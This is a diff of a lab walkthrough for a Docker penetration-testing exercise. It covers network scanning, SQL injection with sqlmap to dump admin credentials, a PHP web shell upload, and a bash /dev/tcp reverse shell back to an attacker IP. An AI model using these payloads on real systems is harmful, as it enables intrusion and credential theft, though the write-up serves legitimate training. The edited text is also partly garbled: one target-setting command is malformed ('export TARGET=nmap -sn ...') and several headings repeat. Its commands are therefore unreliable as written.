@@ -5,7 +5,32 @@
 
 **Author:** *Fedra Bayu*
 
-> **Target IP:** 103.31.33.37
+> **Target IP:** In this lab: `172.19.0.2` (Docker internal) | Real-world equivalent: `103.31.33.37` (public IP)
+
+## 🎯 Quick Start Guide
+
+### For the Impatient
+```bash
+# 1. Start the lab
+cd MBPTL/mbptl/
+docker-compose up -d
+
+# 2. Access the Kali attack container
+docker exec -it -u kali attacker-kali bash
+
+# 3. Set your target
+export TARGET=172.19.0.2
+
+# 4. Follow the writeup below!
+```
+
+### Understanding This Lab
+This lab simulates a real-world penetration testing scenario using Docker containers. While we use internal Docker IPs (like `172.19.0.2`), the methodology is identical to testing real external IPs. The key difference is that in a real engagement, you would:
+- Start with a domain name or public IP
+- Perform OSINT and reconnaissance to discover your targets
+- Work within the scope defined by your client
+
+In this lab, we'll use realistic discovery techniques to find our targets on the Docker network, simulating an internal network penetration test.
 
 ## Table of Contents
 1. [Reconnaissance](#reconnaissance)
@@ -16,58 +41,218 @@
 
 ## Prerequisites
 Before starting this lab, ensure you have the following tools installed:
-- Kali Linux or similar penetration testing distribution
+- Kali Linux or similar penetration testing distribution (or use the included `attacker-kali` container)
 - Basic knowledge of Linux command line
 - Understanding of web application vulnerabilities
 
-## Reconnaissance
+## Understanding Lab vs Real-World Environments
 
-### Port Scanning
-Port scanning is the first step in any penetration test to identify open services. Nmap is the most commonly used tool due to its accuracy and comprehensive results. Alternatives include masscan, rustscan, and others.
+### 🌐 Real-World Reconnaissance
+Before we dive into the lab, it's crucial to understand how target identification works in real penetration testing:
 
-#### Install Nmap
+#### External Penetration Test (Black Box)
+In a real-world external test, you typically start with:
+
+**Given Information:**
+- Company name: "ACME Corporation"
+- Domain: `www.acme-corp.com`
+- Scope of engagement (what you CAN test)
+
+**Your Discovery Process:**
+
+1. **DNS Lookup** - Find IPs behind domains:
 ```bash
-sudo apt install nmap
+nslookup acme-corp.com
+# Returns: 203.45.67.89
+
+host acme-corp.com
+# acme-corp.com has address 203.45.67.89
 ```
 
-#### Basic Usage
+2. **WHOIS Lookup** - Identify network ranges:
 ```bash
-nmap 103.31.33.37
+whois acme-corp.com
+# NetRange: 203.45.67.0 - 203.45.67.255
+# Organization: ACME Corp
+```
+
+3. **Subdomain Enumeration** - Find additional targets:
+```bash
+subfinder -d acme-corp.com
+amass enum -d acme-corp.com
+# Discovers: admin.acme-corp.com, dev.acme-corp.com, mail.acme-corp.com
+```
+
+4. **ASN/Network Discovery** - Find entire IP blocks:
+```bash
+whois -h whois.radb.net -- '-i origin AS12345'
+```
+
+#### Internal Penetration Test
+For internal tests with network access:
+
+1. **Identify Your Network**:
+```bash
+ip addr show
+# You're on: 192.168.10.50/24
+```
+
+2. **Network Discovery**:
+```bash
+# Find all live hosts on your subnet
+nmap -sn 192.168.10.0/24
+
+# Check ARP table for recently contacted hosts
+arp -a
+
+# View routing table for other network segments
+route -n
+```
+
+3. **Service Discovery**:
+```bash
+# Scan for web servers, databases, etc.
+nmap -sV 192.168.10.0/24
+```
+
+### 🧪 This Lab Environment
+In this Docker-based lab, we simulate a real-world scenario with some convenient shortcuts:
+
+**Docker Networking:**
+- Each container gets an internal IP (e.g., 172.19.0.2)
+- Containers can resolve each other by service name
+- The lab exposes certain ports to `localhost` for external access
+
+**Two Ways to Approach This Lab:**
+
+1. **Realistic Mode** - Discover the network first:
+```bash
+# Find your network
+ip addr show
+
+# Discover all hosts
+nmap -sn 172.19.0.0/24
+
+# Scan discovered IPs
+nmap 172.19.0.2
+```
+
+2. **Convenient Mode** - Use Docker service names:
+```bash
+# Docker DNS resolution
+nmap mbptl-main  # Resolves to 172.19.0.2
+```
+
+**For this writeup, we'll use the realistic approach to mirror real-world methodology.**
+
+---
+
+## Reconnaissance
+
+### Phase 1: Network Discovery
+
+First, let's understand what network we're on and discover potential targets.
+
+#### Access the Attack Container
+```bash
+# Start the lab
+docker-compose up -d
+
+# Access the Kali attack container
+docker exec -it -u kali attacker-kali bash
+```
+
+#### Discover Your Network
+```bash
+# Check your network interface
+ip addr show eth0
+```
+
+**Expected Output:**
+```
+inet 172.19.0.5/16 brd 172.19.255.255 scope global eth0
+```
+
+This tells us we're on the `172.19.0.0/16` network.
+
+#### Host Discovery
+```bash
+# Scan for live hosts on the network
+nmap -sn 172.19.0.0/24
+```
+
+**Expected Output:**
+```
+Nmap scan report for 172.19.0.1
+Host is up (0.000010s latency).
+
+Nmap scan report for mbptl-main.mbptl_default (172.19.0.2)
+Host is up (0.000020s latency).
+
+Nmap scan report for mbptl-app.mbptl_default (172.19.0.3)
+Host is up (0.000020s latency).
+
+Nmap scan report for mbptl-internal.mbptl_default (172.19.0.4)
+Host is up (0.000020s latency).
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.5 seconds
+```
+
+**Analysis:** We've discovered 3 target hosts on the network. Let's investigate the most interesting one first: `172.19.0.2`
+
+### Phase 2: Port Scanning
+
+Port scanning is the first step to identify open services on discovered hosts. Nmap is the industry standard tool for this purpose.
+
+#### Set Target Variable
+For convenience, let's set our primary target:
+```bash
+export TARGET=nmap -sn 172.19.0.0/24
+echo "Target set to: $TARGET"
+```
+
+#### Basic Port Scan
+```bash
+nmap $TARGET
+```
+
+#### Basic Port Scan
+```bash
+nmap $TARGET
 ```
 
 #### Results
 ```
-attacker@MBPTL:~$ nmap 103.31.33.37
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-01 00:00 WIB
-Nmap scan report for ip-37-33-31-103.xxx-1337.mbptl.io (103.31.33.37)
-Host is up (0.00073s latency).
-Not shown: 997 filtered ports
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-01-01 00:00 UTC
+Nmap scan report for mbptl-main.mbptl_default (172.19.0.2)
+Host is up (0.0000020s latency).
+Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE
 80/tcp   open  http
 8080/tcp open  http-proxy
 
-Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
 ```
 
 **Analysis:** We discovered two HTTP services running on ports 80 and 8080, indicating web applications are accessible.
 
-### Information Gathering
+> **Note:** In the original writeup, the target IP is shown as `103.31.33.37` to simulate a real external IP address. In this Docker lab environment, we use the actual container IP `172.19.0.2`. The methodology remains identical - you're simply working with internal network addresses instead of public ones.
+
+### Phase 3: Service Enumeration
+### Phase 3: Service Enumeration
+
 HTTP response headers often contain valuable information about the server configuration, technologies used, and potential vulnerabilities. We'll use `curl` to gather this information.
 
-#### Install curl
-```bash
-sudo apt install curl
-```
+**Note:** The `curl` tool is pre-installed in the `attacker-kali` container. In a real scenario on your own system, you would install it with `sudo apt install curl`.
 
-#### Basic Usage
+#### Enumerate Port 80
 We'll use the `-I` flag to retrieve only the response headers:
 ```bash
-curl -I 103.31.33.37
+curl -I http://$TARGET/
 ```
 
 #### Port 80 Results
 ```
-❯ curl -I http://103.31.33.37/
 HTTP/1.1 200 OK
 Date: Thu, 07 Mar 2024 14:38:43 GMT
 Server: Apache/2.4.52 (Debian)
@@ -75,9 +260,13 @@ X-Powered-By: PHP/7.3.33
 Content-Type: text/html; charset=UTF-8
 ```
 
+#### Enumerate Port 8080
+```bash
+curl -I http://$TARGET:8080/
+```
+
 #### Port 8080 Results
 ```
-❯ curl -I http://103.31.33.37:8080/
 HTTP/1.1 200 OK
 Date: Thu, 07 Mar 2024 14:39:31 GMT
 Server: Apache/2.4.52 (Debian)
@@ -91,69 +280,64 @@ Content-Type: text/html
 
 **Analysis:** Both services run Apache 2.4.52 on Debian. Port 80 uses PHP 7.3.33, while port 8080 appears to serve static content.
 
-### Directory Scanning
+### Phase 4: Directory Enumeration
+### Phase 4: Directory Enumeration
+
 Since we found HTTP services, we can discover hidden directories and files using directory scanning tools. We'll use `dirsearch` as it's beginner-friendly and effective.
 
-#### Install Python3 and Pip3
+**Note:** Dirsearch is pre-installed in `~/tools/dirsearch/` in the `attacker-kali` container.
+
+#### Navigate to Tools Directory
 ```bash
-sudo apt install python3 python3-pip -y
+cd ~/tools/dirsearch
 ```
 
-#### Clone Dirsearch Repository
+#### Scan Port 80
 ```bash
-git clone https://github.com/maurosoria/dirsearch
+python3 dirsearch.py -u http://$TARGET/
 ```
 
-#### Install Python Package Requirements
+**Alternative using the pre-configured alias:**
 ```bash
-cd dirsearch
-pip3 install -r requirements.txt
-```
-
-#### Basic Usage
-```bash
-❯ python3 dirsearch.py -u http://103.31.33.37/
+dirsearch -u http://$TARGET/
 ```
 
 #### Port 80 Results
 ```
-❯ python3 dirsearch.py -u http://103.31.33.37/
-
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722
 
-Output: /home/fedra/dirsearch/reports/http_103.31.33.37/__24-03-07_21-12-21.txt
+Output: /home/kali/tools/dirsearch/reports/http_172.19.0.2/__24-03-07_21-12-21.txt
 
-Target: http://103.31.33.37/
+Target: http://172.19.0.2/
 
 [21:12:21] Starting:
-[21:14:19] 301 -  314B  - /img  ->  http://103.31.33.37/img/
-[21:14:19] 301 -  314B  - /inc  ->  http://103.31.33.37/inc/
+[21:14:19] 301 -  314B  - /img  ->  http://172.19.0.2/img/
+[21:14:19] 301 -  314B  - /inc  ->  http://172.19.0.2/inc/
 
 Task Completed
 ```
 
-#### Port 8080 Results
+#### Scan Port 8080
 ```bash
-❯ python3 dirsearch.py -u http://103.31.33.37:8080/
+dirsearch -u http://$TARGET:8080/
 ```
 
+#### Port 8080 Results
 ```
-❯ python3 dirsearch.py -u http://103.31.33.37:8080/
-
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722
 
-Output: /home/fedra/dirsearch/reports/http_103.31.33.37_8080/__24-03-07_21-20-24.txt
+Output: /home/kali/tools/dirsearch/reports/http_172.19.0.2_8080/__24-03-07_21-20-24.txt
 
-Target: http://103.31.33.37:8080/
+Target: http://172.19.0.2:8080/
 
 [21:20:24] Starting:
-[21:21:26] 301 -  331B  - /administrator  ->  http://103.31.33.37:8080/administrator/
+[21:21:26] 301 -  331B  - /administrator  ->  http://172.19.0.2:8080/administrator/
 [21:21:26] 200 -    2KB - /administrator/
 [21:21:26] 200 -    2KB - /administrator/index.php
 
@@ -164,12 +348,39 @@ Task Completed
 - Port 80: `/img` and `/inc` directories
 - Port 8080: `/administrator` directory with an `index.php` file
 
+### Reconnaissance Summary
+
+**Discovered Assets:**
+| IP Address  | Hostname                    | Open Ports | Services                  | Interesting Findings |
+|-------------|-----------------------------| -----------|---------------------------|----------------------|
+| 172.19.0.2  | mbptl-main.mbptl_default    | 80, 8080   | Apache 2.4.52, PHP 7.3.33 | Admin panel on :8080 |
+| 172.19.0.3  | mbptl-app.mbptl_default     | Unknown    | To be investigated        | Internal network     |
+| 172.19.0.4  | mbptl-internal.mbptl_default| Unknown    | To be investigated        | Internal network     |
+
+**Next Steps:**
+1. Investigate web application on port 80 for vulnerabilities
+2. Attempt to access administrator panel on port 8080
+3. After initial compromise, pivot to internal hosts
+
 ## Vulnerability Analysis
 
 After examining both web services, we found that port 8080 contains an administrator panel. However, the main vulnerability was discovered on port 80.
 
-### SQL Injection Discovery
-While exploring the web application on port 80, we noticed that clicking on items in the list changed the URL to `detail.php?id=1`. This parameter-based URL structure is a common indicator of potential SQL injection vulnerabilities.
+### Manual Testing for SQL Injection
+
+While exploring the web application on port 80 (accessible at `http://$TARGET/` or from your host machine at `http://localhost/`), we noticed that clicking on items in the book list changed the URL to `detail.php?id=1`. 
+
+**Why This Matters:**
+This parameter-based URL structure is a common indicator of potential SQL injection vulnerabilities. The application is likely querying a database using this ID parameter.
+
+#### Testing Method
+```bash
+# From the Kali container
+curl "http://$TARGET/detail.php?id=1'"
+
+# Or test from your browser on the host machine
+# http://localhost/detail.php?id=1'
+```
 
 **Testing for SQL Injection:**
 When we added a single quote (`'`) to the URL parameter (`detail.php?id=1'`), the application returned an SQL error:
@@ -178,28 +389,43 @@ When we added a single quote (`'`) to the URL parameter (`detail.php?id=1'`), th
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
 ```
 
-This error message confirms that the application is vulnerable to SQL injection, as it's directly concatenating user input into SQL queries without proper sanitization.
+**Analysis:** This error message confirms that:
+1. The application is vulnerable to SQL injection
+2. It's using MySQL as the backend database
+3. User input is being directly concatenated into SQL queries without proper sanitization
+4. The application has verbose error reporting enabled (information disclosure)
+
+**Vulnerable Code Pattern (example):**
+```php
+// Vulnerable code that likely exists in detail.php
+$id = $_GET['id'];
+$query = "SELECT * FROM books WHERE id = '$id' LIMIT 1";
+// When we send id=1', the query becomes:
+// SELECT * FROM books WHERE id = '1'' LIMIT 1  <-- Syntax error!
+```
 
 ## Exploitation
 
-### SQL Injection with SQLMap
+### Automated SQL Injection with SQLMap
+
 We can exploit the SQL injection vulnerability using `sqlmap`, the most popular automated SQL injection tool. This tool can automatically detect and exploit various types of SQL injection vulnerabilities.
 
-#### Clone SQLMap Repository
-```bash
-git clone https://github.com/sqlmapproject/sqlmap
-cd sqlmap
-```
+**Note:** SQLMap is pre-installed in `~/tools/sqlmap/` in the `attacker-kali` container.
 
-#### Basic Usage
+#### Navigate to SQLMap
 ```bash
-❯ python3 sqlmap.py -u <Vulnerable URL with Parameter>
+cd ~/tools/sqlmap
 ```
 
 #### Enumerating Databases
 We'll use the `--dbs` flag to list all available databases:
 ```bash
-python3 sqlmap.py -u 'http://103.31.33.37/detail.php?id=1' --dbs
+python3 sqlmap.py -u "http://$TARGET/detail.php?id=1" --dbs
+```
+
+**Alternative using the pre-configured alias:**
+```bash
+sqlmap -u "http://$TARGET/detail.php?id=1" --dbs
 ```
 
 **Results:**
@@ -222,7 +448,7 @@ available databases [6]:
 
 #### Dumping the Administrator Database
 ```bash
-python3 sqlmap.py -u 'http://103.31.33.37/detail.php?id=1' -D administrator --dump
+sqlmap -u "http://$TARGET/detail.php?id=1" -D administrator --dump
 ```
 
 **Results:**
@@ -253,9 +479,12 @@ The password field contains a hash value. We can crack this hash using online ha
 Now that we have valid credentials (`admin:P@assw0rd!`), we can access the administrator panel discovered on port 8080.
 
 **Login Details:**
-- URL: `http://103.31.33.37:8080/administrator/`
+- URL from Kali container: `http://$TARGET:8080/administrator/` or `http://172.19.0.2:8080/administrator/`
+- URL from host machine: `http://localhost:8080/administrator/`
 - Username: `admin`
 - Password: `P@assw0rd!`
+
+> **Note:** You can access the web interface from your host machine's browser at `http://localhost:8080/administrator/` since the docker-compose configuration exposes port 8080 to your local machine.
 
 ### File Upload Vulnerability
 After successfully logging into the administrator panel, we discovered a file upload feature. Since the application uses PHP as the backend, we can attempt to upload a malicious PHP file to gain command execution.
@@ -286,11 +515,21 @@ Warning: system(): Cannot execute a blank command in /var/www/html/administrator
 **Analysis:** The file is located at `/var/www/html/administrator/uploads/` with a randomly generated filename.
 
 #### Command Execution
-Now we can execute Linux commands by appending `?command=<command>` to the file URL:
+Now we can execute Linux commands by appending `?command=<command>` to the file URL.
+
+**From the Kali container:**
+```bash
+curl "http://$TARGET/administrator/uploads/FILENAME.php?command=ls+-lah"
+```
+
+**From your host browser:**
+```
+http://localhost/administrator/uploads/FILENAME.php?command=ls -lah
+```
 
 **Example:**
 ```bash
-http://103.31.33.37/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php?command=ls -lah
+http://localhost/administrator/uploads/e77a53f1b6b4aba6d1fc86e42767ce4c.php?command=ls -lah
 ```
 
 **Results:**
@@ -332,9 +571,22 @@ cat /flag/user.txt
 ### Establishing a Reverse Shell
 A reverse shell provides a more stable and interactive connection to the target system. It runs on the target but connects back to our attacking machine.
 
-#### Install Netcat
+**Note:** Netcat is pre-installed in the `attacker-kali` container.
+
+#### Find Your Attack Machine's IP
+First, we need to know the IP address of our Kali container so the target knows where to connect back:
+
 ```bash
-sudo apt install nc -y
+# Get your IP on the Docker network
+ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
+```
+
+**Expected output:** `172.19.0.5` (or similar)
+
+Set this as a variable:
+```bash
+export ATTACKER_IP=$(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+echo "Attacker IP: $ATTACKER_IP"
 ```
 
 #### Setting Up a Listener
@@ -343,13 +595,15 @@ We'll use netcat to listen for incoming connections:
 nc -lp 1337
 ```
 
+**Open a new terminal** to create the payload while the listener runs.
+
 #### Reverse Shell Payload
 Create a new PHP file with the reverse shell payload:
 ```php
-<?php system('bash -c "bash -i >& /dev/tcp/192.168.56.1/1337 0>&1"'); ?>
+<?php system('bash -c "bash -i >& /dev/tcp/172.19.0.5/1337 0>&1"'); ?>
 ```
 
-**Note:** Replace `192.168.56.1` with your actual attacking machine's IP address.
+**Note:** Replace `172.19.0.5` with your actual `$ATTACKER_IP` discovered above.
 
 #### Establishing the Connection
 After uploading and accessing the file, we receive a reverse shell connection:
